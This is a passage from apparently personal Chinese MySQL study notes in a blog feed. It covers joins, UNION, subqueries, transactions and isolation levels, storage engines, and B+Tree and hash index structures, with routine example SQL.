  where e.`salary` BETWEEN j.`lowest_sal` AND j.`highest_sal`;
  ```

### 自连接

关联条件为同一个表的不同字段的多表查询

```mysql
-- 查询员工id,员工姓名及其管理者的id和姓名
SELECT emp.employee_id,emp.last_name,mgr.employee_id,mgr.last_name
FROM employees emp ,employees mgr
WHERE emp.`manager_id` = mgr.`employee_id`;
```

### 内连接/外连接

- **内连接**

  多表查询结果集中不包含一个表与另一个表不匹配的行

  ```mysql
  -- 查询员工信息及部门信息(隐式内连接)
  SELECT employee_id,department_name
  FROM employees e,departments d
  WHERE e.`department_id` = d.department_id;
  
  -- 或使用INNER JOIN 实现同样的需求(显示内连接)
  SELECT employee_id,department_name
  FROM employees e INNER JOIN departments d
  ON e.`department_id` = d.department_id;
  ```

- **外连接**

  多表查询结果集中除了包含一个表与另一个表匹配的行之外的行数据, 包含**左外连接**和**右外连接**

  - **左外连接**

    两个表在连接过程中除了返回满足连接条件的行以外, 还返回左表中不满足条件的行

    ```mysql
    -- 查询 所有 的员工的last_name,department_name信息 
    SELECT employee_id,department_name
    FROM employees e LEFT JOIN departments d
    ON e.`department_id` = d.department_id;
    ```

    ![image-20220706175720567](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c614c7ec461a46bff9711fe282da7aa7-b65701c.png)

    > 左表与右表不匹配, 默认赋值为Null

  - **右外连接**

    两个表在连接过程中除了返回满足连接条件的行以外, 还返回右表中不满足条件的行

    ```mysql
    -- 查询 所有 的部门的last_name,department_name信息 
    SELECT last_name,department_name
    FROM employees e RIGHT OUTER JOIN departments d
    ON e.`department_id` = d.`department_id`;
    ```

    ![image-20220706175904303](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/34de1b0cfa18f40716059232a78abc6e-ddbf100.png)

    > 某些部门没有员工, 即右表与左表不匹配, 默认赋值为Null

  - **满外连接**

    **满外连接**的结果 = 左右表匹配的数据 + 左表没有匹配到的数据 + 右表没有匹配到的数据。
    SQL99是支持满外连接的。使用`FULL JOIN` 或 `FULL OUTER JOIN`来实现。
    需要注意的是，**MySQL不支持FULL JOIN**，但是可以用 `LEFT JOIN UNION RIGHT join`代替。

    ```mysql
    SELECT employee_id,department_name
    FROM employees e LEFT JOIN departments d
    ON e.`department_id` = d.`department_id`
    UNION ALL
    SELECT employee_id,department_name
    FROM employees e RIGHT JOIN departments d
    ON e.`department_id` = d.`department_id`
    WHERE e.`department_id` IS NULL;
    ```

### UNION使用

**UNION** 用于合并查询结果.

利用`UNION`关键字，可以给出多条SELECT语句，并将它们的结果组合成单个结果集。合并时，两个表对应的列数和数据类型必须相同，并且相互对应。各个SELECT语句之间使用`UNION`或`UNION ALL`关键字分隔。

```mysql
-- 语法格式
SELECT column,... FROM table1
UNION [ALL]
SELECT column,... FROM table2
```

- **UNION**

  `UNION` 操作符返回两个查询的结果集的并集，去除重复记录。

  ![image-20220706180626678](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0d33119ab35af3c54266157e3f6d7e46-685723f.png)

  



- **UNION ALL**

  `UNION ALL`操作符返回两个查询的结果集的并集。对于两个结果集的重复部分，不去重

  ![image-20220706180704144](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c138fdc2c606340c06eba10ffd3f19f3-b87c761.png)

> 注意：执行`UNION ALL`语句时所需要的资源比`UNION`语句少。如果明确知道合并数据后的结果数据不存在重复数据，或者不需要去除重复的数据，则尽量使用`UNION ALL`语句，以提高数据查询的效率

```MYSQL
-- 查询中国用户中男性的信息以及美国用户中年男性的用户信息
SELECT id,cname FROM t_cnmale WHERE csex='男'
UNION ALL
SELECT id,tname FROM t_usmale WHERE tGender='male';
```

### 7种 JOINS的实现

![image-20220706181002857](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d1f150388b55b7629b82c24fe51f6852-f0d198f.png)

### 自然连接

SQL99 在 SQL92 的基础上提供了一些特殊语法，比如  `NATURAL JOIN` 用来表示**自然连接**。我们可以把自然连接理解为的等值连接。它会帮你**自动查询**两张连接表中 **所有相同的字段** ，然后进行 **等值连接** 。

```mysql
-- 下面两句SQL执行结果是一样的
SELECT employee_id,last_name,department_name
FROM employees e NATURAL JOIN departments d;

SELECT employee_id,last_name,department_name
FROM employees e JOIN departments d
ON e.`department_id` = d.`department_id`
AND e.`manager_id` = d.`manager_id`;
```

### USING

当多表进行连接的时候，还支持使用 `USING` 指定数据表里的 **同名字段** 进行等值连接。但是**只能配合JOIN**一起使用。比如：

```mysql
-- 下面两句SQL执行结果是一样的
SELECT employee_id,last_name,department_name
FROM employees e JOIN departments d
USING (department_id);

SELECT employee_id,last_name,department_name
FROM employees e ,departments d
WHERE e.department_id = d.department_id;
```

### 多表连接注意

要 **控制连接表的数量** 。多表连接就相当于嵌套 for 循环一样，非常消耗资源，会让 SQL 查询性能下降得很严重，因此不要连接不必要的表。在许多 DBMS 中，也都会有最大连接表的限制。

```
【强制】超过三个表禁止 join。需要 join 的字段，数据类型保持绝对一致；多表关联查询时， 保
证被关联的字段需要有索引。
说明：即使双表 join 也要注意表索引、SQL 性能。
```

### 多表查询示例

![image-20220706190420600](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/db8ddca1f2e68a9171a6e36ad4be0e71-30f5961.png)

```mysql
-- 1.显示所有员工的姓名，部门号和部门名称。
SELECT CONCAT(e.first_name, '.', e.last_name) ename, d.department_id, d.department_name
FROM employees e 
LEFT JOIN departments d USING(department_id)

-- 2.查询90号部门员工的job_id和90号部门的location_id
SELECT e.job_id,d.location_id
FROM employees e 
RIGHT JOIN departments d USING(department_id) 
WHERE d.department_id = 90;

-- 3.查询所有有奖金的员工的 last_name , department_name , location_id , city
SELECT e.last_name,d.department_name,l.location_id,l.city
FROM employees e 
LEFT JOIN departments d USING(department_id) 
LEFT JOIN locations l USING (location_id)
WHERE e.commission_pct IS NOT NULL;

-- 4.选择city在Toronto工作的员工的 last_name , job_id , department_id , department_name
SELECT e.last_name,e.job_id,d.department_name,d.department_name
FROM employees e LEFT JOIN departments d USING(department_id) 
LEFT JOIN locations l USING (location_id)
WHERE l.city = 'Toronto';

-- 6.选择指定员工的姓名，员工号，以及他的管理者的姓名和员工号，结果类似于下面的格式
-- employees 	Emp# 		manager 		Mgr#
-- kochhar 		101 		king 				100
SELECT e.last_name employees, e.employee_id 'Emp#', m.last_name manager, m.employee_id 'Mgr#'
FROM employees e
LEFT JOIN employees m
ON e.manager_id = m.employee_id;

-- 7.查询哪些部门没有员工
SELECT e.employee_id,d.department_id,d.department_name
FROM employees e RIGHT JOIN departments d USING(department_id) 
WHERE e.employee_id IS NULL;

-- 8. 查询哪个城市没有部门
SELECT l.city, d.department_id
FROM locations l
LEFT JOIN departments d USING(location_id)
WHERE d.department_id IS NULL;
```

## 子查询

SQL语句中嵌套SELECT语句，称为嵌套查询，又称子查询。

```mysql
SELECT * FROM t1 WHERE column1 = ( SELECT column1 FROM t2 ); 
```

子查询外部的语句可以是INSERT / UPDATE / DELETE / SELECT 的任何一个。

### 子查询分类

根据**子查询结果**不同，分为：

- **标量子查询**  (子查询结果为单个值）

  子查询返回的结果是单个值（数字、字符串、日期等），最简单的形式，这种子查询称为标量子查询。

  > 常用的操作符：`= `  `<>`   `>`   `>=`   `<`   `<=`

  ```mysql
  -- 查询 "销售部" 的所有员工信息
  select * from emp where dept_id = (select id from dept where name = '销售部');
  
  -- 查询在 "Hunold" 入职之后的员工信息
  select * from emp where entrydate > (select entrydate from emp where name = 'Hunold');
  ```

- **列子查询**  (子查询结果为一列)

  子查询返回的结果是一列（可以是多行），这种子查询称为列子查询。

  常用操作符:

  | 操作符 | 描述                                   |
  | ------ | -------------------------------------- |
  | IN     | 在指定的集合范围之内，多选一           |
  | NOT IN | 不在指定的集合范围之内                 |
  | ANY    | 子查询返回列表中，有任意一个满足即可   |
  | SOME   | 与ANY等同，使用SOME的地方都可以使用ANY |
  | ALL    | 子查询返回列表的所有值都必须满足       |

    ```mysql
  -- 查询 "销售部" 和 "市场部" 的所有员工信息
  select * from emp where dept_id 
  in (select id from dept where name = '销售部' or name = '市场部');
  
  -- 查询比 "财务部" 所有人工资都高的员工信息
  select * from emp where salary 
  > all ( 
      select salary from emp where dept_id =(select id from dept where name = '财务部') 
  );
    ```

- **行子查询**  (子查询结果为一行)

  子查询返回的结果是一行（可以是多列），这种子查询称为行子查询。

  > 常用的操作符：`= `、`<>` 、`IN` 、`NOT IN`

  ```mysql
  -- 查询与 "Hunold" 的薪资及直属领导相同的员工信息 ;
  select * from emp where (salary,managerid) = (select salary, managerid from emp where name = 'Hunold') and name != 'Hunold';
  ```

- **表子查询**  (子查询结果为多行多列)

  子查询返回的结果是多行多列，这种子查询称为表子查询。

  > 常用的操作符：`IN ` 

  ```mysql
  -- 查询与 "Lex" , "David" 的职位和薪资相同的员工信息
  select * from emp where (job,salary) in ( select job, salary from emp where name ='Lex' or name = 'David' );
  
  -- 查询入职日期是 "2006-01-01" 之后的员工信息 , 及其部门信息
  select e.*, d.* from (select * from emp where entrydate > '2006-01-01') e left join dept d on e.dept_id = d.id ;
  ```



按**内查询是否被执行多次**，将子查询划分为 **相关(或关联)子查询** 和 **不相关(或非关联)子查询** 。

- 关联子查询

  如果子查询需要执行多次，即采用循环的方式，先从外部查询开始，每次都传入子查询进行查询，然后再将结果反馈给外部，这种嵌套的执行方式就称为相关子查询。

- 非关联子查询 

  子查询从数据表中查询了数据结果，如果这个数据结果只执行一次，然后这个数据结果作为主查询的条件进行执行，那么这样的子查询叫做不相关子查询。

### 相关子查询

如果子查询的执行依赖于外部查询，通常情况下都是因为**子查询中的表用到了外部的表**，并进行了**条件关联**，因此每执行一次外部查询，子查询都要**重新计算**一次，这样的子查询就称之为 **关联子查询** 。

```mysql
-- 查询员工中工资大于本部门平均工资的员工的last_name,salary和其department_id

-- 方式一：相关子查询
SELECT e.last_name,e.salary,e.department_id FROM employees e 
WHERE e.salary > 
	(SELECT AVG(salary) FROM employees WHERE department_id = e.department_id);

-- 方式二：在 FROM 中使用子查询
SELECT e1.last_name,e1.salary,e1.department_id 
FROM employees e1,
	(SELECT department_id,AVG(salary) dept_avg_sal 
    FROM employees 
    GROUP BY department_id) e2
WHERE e1.`department_id` = e2.department_id AND e2.dept_avg_sal < e1.`salary`;
```

#### `EXISTS` 与 `NOT EXISTS`关键字

- 关联子查询通常也会和 EXISTS操作符一起来使用，用来检查在子查询中是否存在满足条件的行。
- 如果在子查询中**不存在**满足条件的行：
  - 条件返回 FALSE
  - 继续在子查询中查找
- 如果在子查询中**存在**满足条件的行：
  - 不在子查询中继续查找
  - 条件返回 TRUE
- NOT EXISTS关键字表示如果不存在某种条件，则返回TRUE，否则返回FALSE。

```mysql
-- 查询公司管理者的employee_id，last_name，job_id，department_id信息
SELECT e1employee_id, e1last_name, e1job_id, e1department_id
FROM  employees e1
WHERE EXISTS ( SELECT * FROM  employees e2 WHERE e2.manager_id = e1.employee_id);

-- 查询departments表中，不存在于employees表中的部门的department_id和department_name
SELECT department_id, department_name
FROM departments d
WHERE NOT EXISTS (SELECT 'X' FROM  employees WHERE department_id = d.department_id);
```

#### 相关更新

使用相关子查询依据一个表中的数据更新另一个表的数据。

```mysql
UPDATE table1 alias1
SET column = (SELECT expression FROM  table2 alias2 WHERE alias1.column = alias2.column);
```

```mysql
-- 在employees中增加一个department_name字段，数据为员工对应的部门名称
UPDATE employees e
SET department_name = 
(SELECT department_name FROM departments d WHERE e.department_id = d.department_id);
```

#### 相关删除

使用相关子查询依据一个表中的数据删除另一个表的数据。

```mysql
DELETE FROM table1 alias1
WHERE column operator 
(SELECT expression FROM  table2 alias2 WHERE alias1.column = alias2.column);
```

```mysql
-- 删除表employees中，其与emp_history表皆有的数据
DELETE FROM employees e
WHERE e.employee_id in (SELECT employee_id FROM emp_history);
```

## 事务

**事务** 是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。

### 事务操作

- **控制事务一**

  查看/设置事务提交方式

  ```mysql
  -- 查询当前事务提交方式
  SELECT @@autocommit;
  -- 设置为手动提交
  SET @@autocommit = 0;	
  ```

  提交事务

  ```mysql
  COMMIT;
  ```

  回滚事务

  ```mysql
  ROLLBACK;
  ```

  > 注意：上述的这种方式是修改了事务的自动提交行为, 把默认的自动提交修改为了手动提交, 此时执行的DML语句都不会提交, 需要手动的执行commit进行提交。

- **控制事务二**

  开启事务

  ```mysql
  START TRANSACTION;
  -- 或 
  BEGIN; 
  ```

  提交事务

  ```mysql
  COMMIT; 
  ```

  回滚事务

  ```mysql
  ROLLBACK;
  ```

  示例: 

  ```mysql
  -- 开启事务
  start transaction
  
  -- 1. 查询张三余额
  select * from account where name = '张三';
  
  -- 2. 张三的余额减少1000
  update account set money = money - 1000 where name = '张三';
  
  -- 3. 李四的余额增加1000
  update account set money = money + 1000 where name = '李四';
  
  -- 如果正常执行完毕, 则提交事务
  commit;
  
  -- 如果执行过程中报错, 则回滚事务
  -- rollback;
  ```

### 事务四大特性

事务的四大特性，简称**ACID**。

- **原子性**（Atomicity）：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。
- **一致性**（Consistency）：事务完成时，必须使所有的数据都保持一致状态。
- **隔离性**（Isolation）：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行。
- **持久性**（Durability）：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。

### 并发事务问题

![image-20220714142522324](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e8a93d8e3554ac398a5beed445dac42b-58499ec.png)

#### 脏读

一个事务读到另外一个事务还没有提交的数据。

![image-20220714143052165](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a2cc0340f66205bce44c8b152ab96eb8-cd17406.png)

#### 不可重复读

一个事务先后读取同一条记录，但两次读取的数据不同，称之为不可重复读。

![](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/19a214c3ca1f8f45c1ca7c330b321f0f-58b7eaa.png)

#### 幻读

一个事务按照条件查询数据时，没有对应的数据行，但是在插入数据时，又发现这行数据已经存在，好像出现了 "幻影"。

![image-20220714143140146](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c5566878b8fb3db9274efea9a3300d06-f7e2dfe.png)

### 事务隔离级别

为了解决并发事务所引发的问题，在数据库中引入了**事务隔离级别**。主要有以下几种：

|隔离级别 |脏读 |不可重复读 |幻读|
| ---- | ---- | ---- | ---- |
|**未提交度** Read Uncommitted |√ |√ |√|
|**已提交读** Read Committed |× |√ |√|
|**可重复读** Repeatable Read(默认) |× |× |√|
|**序列化** Serializable |× |× |×|

查看事务隔离级别

```mysql
SELECT @@transaction_isolation;
```

设置事务隔离级别

```mysql
SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL { READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE }
```

> 注意：事务隔离级别越高，数据越安全，但是性能越低。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL进阶</title>
    <url>/2022/07/12/MySql/MySQL%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[
## 存储引擎

### MySQL体系结构

![image-20220714150546597](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8ff19007681d8bae395ce72447d04899-24be7f1.png)

- 连接层

  最上层是一些**客户端**和**链接服务**，包含本地sock 通信和大多数基于客户端/服务端工具实现的类似于TCP/IP的通信。主要完成一些类似于连接处理、授权认证、及相关的安全方案。

  在该层上引入了线程池的概念，为通过认证安全接入的客户端提供线程。

  同样在该层上可以实现基于SSL的安全链接。服务器也会为安全接入的每个客户端验证它所具有的操作权限。

- 服务层

  第二层架构主要完成大多数的**核心服务功能**，如SQL接口，并完成缓存的查询，SQL的分析和优化，部分内置函数的执行。

  所有跨存储引擎的功能也在这一层实现，如 过程、函数等。在该层，服务器会解析查询并创建相应的内部解析树，并对其完成相应的优化如确定表的查询的顺序，是否利用索引等，最后生成相应的执行操作。

  如果是select语句，服务器还会查询内部的缓存，如果缓存空间足够大，这样在解决大量读操作的环境中能够很好的提升系统的性能。

- 引擎层

  存储引擎层， 存储引擎真正的负责了MySQL中数据的**存储**和**提取**，服务器通过API和存储引擎进行**通信**。

  不同的存储引擎具有不同的功能，这样我们可以根据自己的需要，来选取合适的存储引擎。

  数据库中的索引是在存储引擎层实现的。

- 存储层

  数据存储层， 主要是将数据(如: redolog、undolog、数据、索引、二进制日志、错误日志、查询日志、慢查询日志等)存储在文件系统之上，并完成与存储引擎的交互。

### **SQL执行流程**

![image-20220714162837039](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/76c1ef0894e7d9c8410576f12e4c4b97-6215ad2.png)

> 从MySQL 5.7.20开始，不推荐使用查询缓存，并在 MySQL 8.0中删除

查询缓存

### 引擎简介

存储引擎就是**存储数据**、**建立索引**、**更新/查询数据**等技术的**实现方式** 。

存储引擎是**基于表**的，而不是基于库的，所以存储引擎也可被称为表类型。我们可以在创建表的时候，来指定选择的存储引擎，如果没有指定将自动选择默认的存储引擎。

**建表时指定存储引擎**

```mysql
CREATE TABLE 表名(
    字段1 字段1类型 [ COMMENT 字段1注释 ] ,
    ......
    字段n 字段n类型 [COMMENT 字段n注释 ]
) ENGINE = INNODB [ COMMENT 表注释 ] ;
```

**修改存储引擎**

```mysql
ALTER TABLE 表名 ENGINE = 存储引擎名称;
```

**查询当前数据库支持的存储引擎**

```mysql
SHOW ENGINES;
```

![image-20220714151323425](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9edd74fd37b68133f8dfdf84692aae56-ab774eb.png)

**查询默认使用引擎**

```mysql
show variables like '%storage_engine%';
```

![image-20220714161858612](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dc5c63c310c3aae1f6cf88146d8632e4-2427e0a.png)

**查询建表语句** 

```mysql
SHOW CREATE TABLE account;
```

```mysql
CREATE TABLE `account` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `name` varchar(10) DEFAULT NULL COMMENT '姓名',
  `money` double(10,2) DEFAULT NULL COMMENT '余额',
   PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COMMENT='账户表'
```

### 引擎特点

介绍三种存储引擎 InnoDB、MyISAM、Memory的特点。

#### InnoDB

InnoDB是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB是默认的MySQL 存储引擎。

- **特点**
  - DML操作遵循ACID模型，支持**事务**；
  - 支持**行级锁**，提高并发访问性能；
  - 支持**外键**FOREIGN KEY约束，保证数据的完整性和正确性；

- **文件**

  **xxx.ibd**：xxx代表的是表名，innoDB引擎的每张表都会对应这样一个表空间文件，存储该表的数据和索引。

  **xxx.frm**: 存储该表的表结构

- **文件生成规则**

    ```mysql
    SHOW VARIABLES LIKE 'innodb_file_per_table';
    ```

    ![image-20220714154232882](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/38b22e59e547447c5513a8d94453d45a-eb74572.png)
    
    如果该参数开启，代表对于InnoDB引擎的表，每一张表都对应一个ibd文件。
    
- **逻辑存储结构**

    ![image-20220714154417247](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d42eda2e8c09a47742a9b5ed59977aab-e209740.png)

    ```
    - 表空间(Tablespace): InnoDB存储引擎逻辑结构的最高层，ibd文件其实就是表空间文件，在表空间中可以包含多个Segment段。
    
    - 段(Segment): 表空间是由各个段组成的， 常见的段有数据段、索引段、回滚段等。InnoDB中对于段的管理，都是引擎自身完成，不需要人为对其控制，一个段中包含多个区。
    
    - 区(Extent): 区是表空间的单元结构，每个区的大小为1M。 默认情况下， InnoDB存储引擎页大小为16K， 即一个区中一共有64个连续的页。
    
    - 页(Page): 页是组成区的最小单元，页也是InnoDB 存储引擎磁盘管理的最小单元，每个页的大小默认为 16KB。为了保证页的连续性，InnoDB 存储引擎每次从磁盘申请 4-5 个区。
    
    - 行(Row): InnoDB存储引擎是面向行的，也就是说数据是按行进行存放的，在每一行中除了定义表时所指定的字段以外，还包含两个隐藏字段(最后一次操作事务的ID 和 指针)。
    ```

#### MyISAM

MyISAM是MySQL早期的默认存储引擎。MyISAM提供了大量的特性，包括全文索引、压缩、空间函数(GIS)等，但MyISAM 不支持事务、行级锁、外键 ，有一个毫无疑问的缺陷就是 崩溃后无法安全恢复 。

- **特点**
  - 不支持事务，不支持外键
  - 支持**表锁**，不支持行锁
  - 访问速度快
  
- **文件**

  **表名.frm** :  存储表结构

  **表名.MYD** :  存储数据 (MYData)

  **表名.MYI** :  存储索引 (MYIndex)

#### Memory

Memory引擎的表数据时存储在内存中的，由于受到硬件问题、或断电问题的影响，只能将这些表作为临时表或缓存使用。另外，要求存储的数据是数据长度不变的格式，比如，Blob和Text类型的数据不可用(长度不固定的)。

- **特点**
  - 内存存放
  - 同时 支持哈希（HASH）索引 和 B+树索引 （默认）
  - MEMORY 表的大小是受到限制 的。表的大小主要取决于两个参数，分别是 `max_rows` 和`max_heap_table_size` 。其中，`max_rows`可以在创建表时指定；`max_heap_table_size`的大小默认为16MB，可以按需要进行扩大。

#### 区别及特点

| 特点 | InnoDB | MyISAM | Memory |
| ---- | ------ | ------ | ------ |
|存储限制 |64TB |有 |有|
|事务安全 |支持| - |-|
|锁机制 |行锁 |表锁 |表锁|
|B+tree索引 |支持 |支持 |支持|
|Hash索引 |- |- |支持|
|全文索引 |支持(5.6版本之后) |支持 |-|
|空间使用 |高 |低 |N/A|
|内存使用 |高 |低 |中等|
|批量插入|速度 |低 |高 |高|
|支持外键 |支持 |- |-|

```
其他见文档:
https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html
https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html
```

### 引擎选择

在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。对于复杂的应用系统，还可以根据实际情况选择多种存储引擎进行组合。

- InnoDB: 是Mysql的默认存储引擎，支持事务、外键。如果应用对事务的完整性有比较高的要求，在并发条件下要求数据的一致性，数据操作除了插入和查询之外，还包含很多的更新、删除操作，那么InnoDB存储引擎是比较合适的选择。
- MyISAM ： 如果应用是以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性、并发性要求不是很高，那么选择这个存储引擎是非常合适的。(日志/评论)
- MEMORY：将所有数据保存在内存中，访问速度快，通常用于临时表及缓存。MEMORY的缺陷就是对表的大小有限制，太大的表无法缓存在内存中，而且无法保障数据的安全性。

## 索引

### 索引概述

**索引(index)**是帮助MySQL高效获取数据的**数据结构**(有序)。

在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构**以某种方式引用（指向）数据**， 这样就可以在这些数据结构上实现高级查找算法，这种数据结构就是索引。

### 索引特点

| 优势 | 劣势 |
| ---- | ---- |
|提高数据检索的效率，降低数据库的IO成本|索引列也是要占用空间的。|
|通过索引列对数据进行排序，降低数据排序的成本，降低CPU的消耗。|索引大大提高了查询效率，同时却也降低更新表的速度，如对表进行INSERT、UPDATE、DELETE时，效率降低。|

### 索引结构

MySQL的索引是在**存储引擎层**实现的，不同的存储引擎有不同的索引结构，主要包含以下几种：

| 索引结构 | 描述 |
| -------- | ---- |
|**B+Tree**索引 |最常见的索引类型，大部分引擎都支持 B+ 树索引|
|**Hash**索引|底层数据结构是用哈希表实现的, 只有精确匹配索引列的查询才有效, 不支持范围查询|
|**R-tree**(空间索引）|空间索引是MyISAM引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少|
|**Full-text**(全文索引)|是一种通过建立倒排索引,快速匹配文档的方式。类似于Lucene,Solr,ES|

不同的存储引擎对于索引结构的支持情况:

| 索引 | InnoDB | MyISAM | Memory |
| ---- | ------ | ------ | ------ |
|B+tree索引 |支持 |支持 |支持|
|Hash 索引 |不支持 |不支持 |支持|
|R-tree 索引 |不支持 |支持 |不支持|
|Full-text |5.6版本之后支持 |支持 |不支持|

> MySQL中平常所说的索引，如果没有特别指明，都是指B+树结构组织的索引。

#### 二叉树

若MySQL的索引结构采用二叉树的数据结构，比较理想的结构如下：

![image-20220720170414537](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7242f0ebc2a73b2603d3ed03d1e32d97-850ae82.png)

如果主键是顺序插入的，则会形成一个单向链表，结构如下:

![image-20220720170441014](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c1ede0149249129101eee3ea24013662-dce5c2d.png)

所以，如果选择二叉树作为索引结构，会存在以下缺点：

- 顺序插入时，会形成一个链表，查询性能大大降低。
- 大数据量情况下，层级较深，检索速度慢。

#### 红黑树

红黑树是一颗自平衡二叉树，那这样即使是顺序插入数据，最终形成的数据结构也是一颗平衡的二叉树, 结构如下:

![image-20220720170557822](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/590ff9a99c6c6397419e6bba583b8b0b-2136f3a.png)

由于红黑树也是一颗二叉树，所以也会存在一个缺点：

- 大数据量情况下，层级较深，检索速度慢。

#### B-Tree

B树是一种**多叉路平衡查找树**，相对于二叉树，B树**每个节点可以有多个分支**，即多叉。以一颗最大度数（`max-degree`）为5(5阶)的b-tree为例，那这个B树每个节点最多存储4个key，5个指针：

![image-20220720170743164](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/542e7a7071f6bcd83c328f2ace5c14ab-973af5d.png)

> 树的度数指的是一个节点的子节点个数。

特点：

- 5阶的B树，每一个节点最多存储4个key，对应5个指针。
- 一旦节点存储的key数量到达5，就会裂变，中间元素向上分裂。
- 在B树中，非叶子节点和叶子节点都会存放数据。

#### B+Tree

B+Tree是B-Tree的变种，我们以一颗最大度数（max-degree）为4（4阶）的b+tree为例，来看一下其结构示意图：

![image-20220720170909471](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/704f8a9105274bb583f9c31216494ec6-e3ca4b1.png)

我们可以看到，两部分：

- 绿色框框起来的部分，是索引部分，仅仅起到索引数据的作用，**不存储数据**。
- 红色框框起来的部分，是数据存储部分，在其**叶子节点中要存储具体的数据**。

B+Tree 与 B-Tree相比，主要有以下三点区别：

- 所有的数据都会出现在叶子节点。
- 叶子节点形成一个单向链表。
- 非叶子节点仅仅起到索引数据作用，具体的数据都是在叶子节点存放的。

#### MySQL中的B+Tree

MySQL索引数据结构对经典的B+Tree进行了优化。在原B+Tree的基础上，增加一个指向相邻叶子节点的**链表指针**，就形成了带有顺序指针的B+Tree，提高区间访问的性能，利于排序。

![image-20220720171110939](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ad21b813a25142af5c61f26c32ff2e53-e742874.png)

#### Hash

MySQL中除了支持B+Tree索引，还支持一种索引类型-Hash索引。

**结构**

哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。

如果两个(或多个)键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。

![image-20220720171228366](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4376240227a2cb936a9cf3556f08cf19-bba95c7.png)

**特点**

- Hash索引只能用于对等比较(=，in)，不支持范围查询（between，>，< ，...）
- 无法利用索引完成排序操作
- 查询效率高，通常(不存在hash冲突的情况)只需要一次检索就可以了，效率通常要高于B+tree索引

> 在MySQL中，支持hash索引的是Memory存储引擎。 而InnoDB中具有**自适应hash**功能，hash索引是InnoDB存储引擎根据B+Tree索引在指定条件下自动构建的。

```
为什么InnoDB存储引擎选择使用B+tree索引结构?

- 相对于二叉树，层级更少，搜索效率高；
- 对于B-tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低；
- 相对Hash索引，B+tree支持范围匹配及排序操作；
```

### 索引分类

在MySQL数据库，将索引的具体类型主要分为以下几类：**主键索引**、**唯一索引**、**常规索引**、**全文索引**。

| 分类 | 含义 | 特点 | 关键字 |
| ---- | ---- | ---- | ------ |
|主键索引|针对于表中主键创建的索引|默认自动创建, 只能有一个|PRIMARY|
|唯一索引|避免同一个表中某数据列中的值重复 |可以有多个 |UNIQUE|
|常规索引|快速定位特定数据 |可以有多个||
|全文索引|全文索引查找的是文本中的关键词，<br />而不是比较索引中的值|可以有多个 |FULLTEXT|

在**InnoDB**存储引擎中，根据索引的存储形式，又可以分为以下两种：

| 分类 | 含义 | 特点 |
| ---- | ---- | ---- |
|**聚集索引/聚簇索引**(ClusteredIndex)|将数据存储与索引放到了一块，索引结构的叶子节点保存了行数据|必须有,而且只有一个|
|**二级索引/非聚簇索引**(SecondaryIndex)|将数据与索引分开存储，索引结构的叶子节点关联的是对应的主键|可以存在多个|

```
聚集索引选取规则:

- 如果存在主键，主键索引就是聚集索引。
- 如果不存在主键，将使用第一个唯一（UNIQUE）索引作为聚集索引。
- 如果表没有主键，或没有合适的唯一索引，则InnoDB会自动生成一个rowid作为隐藏的聚集索引。
```

#### 聚集索引

聚集索引和二级索引的具体结构如下：

![image-20220720172132142](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/247f73b0c1568d5fbbf85e612cda91c3-9616922.png)

- 聚集索引的叶子节点下挂的是这一行的数据 。
- 二级索引的叶子节点下挂的是该字段值对应的主键值。



当执行SQL语句时，具体的查找过程:

![image-20220720172245102](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2519a30bd71605f79dff0305a73cc5ba-1f13c21.png)

① 由于是根据name字段进行查询，所以先根据`name='Arm'`到name字段的**二级索引**中进行匹配查找。但是在二级索引中只能查找到 `Arm` 对应的主键值 `10`。

